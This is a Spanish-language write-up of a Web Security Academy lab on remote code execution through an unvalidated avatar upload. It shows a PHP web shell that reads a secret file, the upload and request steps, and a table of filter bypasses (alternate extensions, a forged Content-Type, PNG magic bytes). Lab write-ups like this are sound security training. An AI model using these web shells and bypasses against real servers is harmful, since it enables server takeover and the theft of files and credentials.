---
title: "Lab: Remote code execution via web shell upload"
date: 2026-05-23
category: "File Upload"
order: 3
tags: ["web-security-academy", "file-upload", "lab", "rce"]
layout: layouts/writeup.njk
permalink: /writeups/file-upload-lab-rce-web-shell.html
---

## Descripción de la vulnerabilidad

File Upload sin validación es una vulnerabilidad donde el servidor permite subir cualquier tipo de archivo sin restricciones — sin verificar la extensión, el contenido ni el tipo MIME. Si el servidor además sirve esos archivos desde una ruta accesible públicamente y los ejecuta (como Apache ejecuta `.php`), un atacante puede subir un **web shell** y obtener ejecución remota de código (RCE).

**Web shell:** archivo de script que, al ser accedido vía HTTP, ejecuta código en el servidor y devuelve el resultado en la respuesta.

---

## Reconocimiento

Al explorar la aplicación, se identificó en la página **My Account** un campo para subir una foto de perfil (avatar). Este tipo de funcionalidad es siempre candidata a probar file upload, porque:

- Acepta archivos del usuario.
- El archivo probablemente se guarda en el servidor.
- Si la ruta es pública y el servidor ejecuta scripts, hay RCE potencial.

Se subió una imagen real primero para observar el comportamiento normal. La respuesta del servidor confirmó la ruta de almacenamiento:

```
The file avatars/foto.png has been uploaded.
```

Y en el código fuente de la página se encontró la ruta donde el servidor sirve el avatar:

```html
<img src="/files/avatars/foto.png" class=avatar>
```

Esto confirmó que los archivos subidos son accesibles públicamente bajo `/files/avatars/`.

---

## Ataque

### Paso 1 — Crear el web shell

Se creó un archivo `exploit.php` con el siguiente contenido:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Esto le dice al servidor PHP: "lee el archivo `/home/carlos/secret` y devolvé su contenido en la respuesta HTTP".

### Paso 2 — Subir el web shell

Se usó el mismo campo de avatar para subir `exploit.php`. El servidor no realizó ninguna validación y respondió:

```
The file avatars/exploit.php has been uploaded.
```

El servidor aceptó el archivo sin ningún filtro.

### Paso 3 — Ejecutar el web shell

Se hizo un `GET` directo al archivo subido:

```
GET /files/avatars/exploit.php HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=...
```

**Resultado:** el servidor ejecutó el PHP y devolvió el secreto de Carlos en el body de la respuesta:

```
KaZWu2Sy2WMkdmQcuB0sz6WpoEKrC49M
```

---

## Por qué funcionó

El servidor tiene dos condiciones que hacen posible el ataque:

1. **No valida el archivo subido** — acepta cualquier extensión y contenido sin restricciones.
2. **Apache ejecuta archivos `.php`** — cuando se accede a `/files/avatars/exploit.php` vía HTTP, Apache no lo sirve como texto plano sino que lo pasa al intérprete de PHP y devuelve el output.

Si el servidor solo guardara el archivo pero lo sirviera como texto plano (sin ejecutarlo), el ataque no funcionaría — se vería el código PHP en lugar de su resultado.

---

## Cómo identificarlo en blackbox

1. **Buscar cualquier campo de subida de archivos** — formularios con `<input type="file">` son el punto de entrada.
2. **Subir un archivo válido primero** — observar si el servidor confirma la ruta donde guardó el archivo en la respuesta.
3. **Inspeccionar el código fuente** — buscar tags `<img src=...>` u otras referencias que revelen dónde se sirven los archivos subidos.
4. **Intentar subir extensiones peligrosas** — `.php`, `.php5`, `.phtml`, `.jsp`, `.asp`, etc.
5. **Si el servidor acepta el archivo**, acceder a la ruta pública vía HTTP.
6. **Verificar ejecución** con un payload simple antes de uno destructivo:

```php
<?php echo "EJECUTADO"; ?>
```

Si la respuesta contiene `EJECUTADO` en lugar del código PHP, hay RCE confirmado.

### Señales de validación (para bypassear en labs posteriores)

<table>
<tr><td>Defensa</td><td>Bypass</td></tr>
<tr><td>Bloquea por extensión</td><td>Probar <code>.php5</code>, <code>.phtml</code>, doble extensión <code>.php.jpg</code></td></tr>
<tr><td>Valida Content-Type</td><td>Cambiar el header a <code>image/jpeg</code> en Burp aunque el archivo sea <code>.php</code></td></tr>
<tr><td>Valida contenido/magic bytes</td><td>Agregar bytes de cabecera PNG al inicio del archivo PHP</td></tr>
</table>

---

## Impacto

- Lectura de archivos del sistema operativo (`/etc/passwd`, secrets, claves privadas).
- Ejecución de comandos arbitrarios en el servidor.
- Movimiento lateral si el servidor tiene acceso a red interna.
- Compromiso total del servidor si el proceso web corre con permisos elevados.
